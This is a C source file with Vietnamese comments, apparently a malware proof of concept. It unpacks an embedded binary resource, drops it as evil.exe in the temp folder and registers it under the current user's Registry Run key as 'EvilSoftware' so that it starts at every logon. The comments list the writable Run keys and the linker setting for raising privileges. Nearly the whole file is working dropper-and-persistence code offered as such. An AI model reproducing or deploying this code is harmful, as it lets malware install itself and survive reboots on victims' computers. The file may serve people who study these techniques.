#include "registry.h"
#include "resource.h"
#include <tchar.h>
#pragma comment(lib, "User32.Lib")

/*
** Mô tả:
** - Đây là một trong các kỹ thuật Persistence cơ bản nhất của Malware
** - Một số các Run Key có thể ghi của Malware:
**  + HKCU\Software\Microsoft\Windows\CurrentVersion\Run
**  + HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
**  + HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
**  + HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
**  + HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
**  + HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
** PoC:
** - Malware tiến thành dropped một tệp thực thi vào %TEMP%
** - Cài đặt Persistence thông qua Registry Run Key.
** - Cần phải có quyền Administrator để có thể ghi vào các khóa Registry
**		=> Project Name > Properties > Linker > Manifest File > UAC Execution Level > Chọn 'highestAvaiable'
** Ref:
** 1. Reading And Writing Windows Registry Using WinAPI
**	https://aticleworld.com/reading-and-writing-windows-registry/
*/


int main()
{
	// *** Stage 1: Find and load resource ***
	HRSRC	hRes;			 // handle/ptr resource
	HGLOBAL	hResLoad;		 // handle to loaded resource
	LPVOID	lpResLock;		 // pointer to resource data

	// Locate the resource in file.
	printf(" [+] Finding resource.\n");
	Sleep(500);

	hRes = FindResourceA(
		NULL,		// locate resource current process
		101,		// name of resource (resource ID)
		"BIN");		// type of resource
	if (hRes == NULL) {
		printf(" [-] Could not locate resource. Error Code = %d\n", GetLastError());
		return;
	}

	// Load the resource into global memory.
	hResLoad = LoadResource(
		NULL,	// current process
		hRes);	// handle to the resource
	if (hResLoad == NULL) {
		printf(" [-] Could not load resource. Error Code = %d\n", GetLastError());
		return;
	}

	// Lock the resource into global memory.
	lpResLock = LockResource(hResLoad);
	if (lpResLock == NULL) {
		printf(" [-] Could not lock resource. Error Code = %d\n", GetLastError());
		return;
	}


	// *** Stage 2: Dropped/Extract/Write resource binary to file ***
	DWORD	dwSizeOfRes = 0;			// size (bytes) of the specified resource
	TCHAR	filePath[MAX_PATH];			// full path of file dropped
	TCHAR	lpTempPathBuffer[MAX_PATH];	// path of temp directory
	DWORD	dwRetVal = 0;				// temp variable

	printf(" [+] Dropping evil file.\n");
	Sleep(500);

	// Calculating size of resource
	dwSizeOfRes = SizeofResource(
		NULL,	// current process
		hRes);	// handle/ptr resource

	// Get the temp path env
	dwRetVal = GetTempPath(
		MAX_PATH,          // length of the buffer
		lpTempPathBuffer); // buffer for path 
	if (dwRetVal > MAX_PATH || (dwRetVal == 0)) {
		printf(" [-] Could not get temp path. Error Code = %d\n", GetLastError());
		return;
	}

	// Generates a temporary file name.
	wsprintfW(filePath, TEXT("%sevil.exe"), lpTempPathBuffer);

	HANDLE	hFileWriter;
	DWORD	dwBytesWritten = 0;
	BOOL	bErrorFlag = FALSE;

	// Create dropped file
	hFileWriter = CreateFile(
		filePath,				// name of the write
		GENERIC_WRITE,			// open for writing
		NULL,					// do not share
		NULL,					// default security
		CREATE_ALWAYS,			// Creates a new file, always.
		FILE_ATTRIBUTE_NORMAL,	// normal file
		NULL);					// no attr. template
	if (hFileWriter == INVALID_HANDLE_VALUE) {
		printf(" [-] Terminal failure: Unable to open file \"%ls\" for write. Error Code = %d\n", filePath, GetLastError());
		return;
	}

	printf(" [+] Writing %d bytes to \"%ls\".\n", dwSizeOfRes, filePath);
	Sleep(500);

	bErrorFlag = WriteFile(
		hFileWriter,		// open file handle
		lpResLock,			// start of data to write
		dwSizeOfRes,		// number of bytes to write
		&dwBytesWritten,	// number of bytes that were written
		NULL);				// no overlapped structure
	if (FALSE == bErrorFlag) {
		printf(" [-] Terminal failure: Unable to write to \"%ls\". Error Code = %d\n", filePath, GetLastError());
	}
	else {
		if (dwBytesWritten != dwSizeOfRes) {
			printf(" [-] Error: dwBytesWritten != dwSizeOfRes. Error Code = %d\n", GetLastError());
		}
		else {
			printf(" [+] Wrote %d bytes to \"%ls\" successfully.\n", dwBytesWritten, filePath);
		}
	}
	CloseHandle(hFileWriter);

	// *** Stage 3: Persistence via Registry Run Key ***
	BOOL status = FALSE;
	Sleep(500);
	// We will write string to: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
	printf(" [+] Setting up Persistence via Registry Run Key.\n");
	status = WriteStringToRegistry(
		HKEY_CURRENT_USER,
		L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		L"EvilSoftware",
		(PWCHAR)filePath);
	if (status != TRUE) {
		printf(" [-] Error write string to Registry. Code = %d\n", GetLastError());
		return;
	}
	Sleep(500);
	printf(" [+] Successfully. Goodbye!\n");

	return 0;
}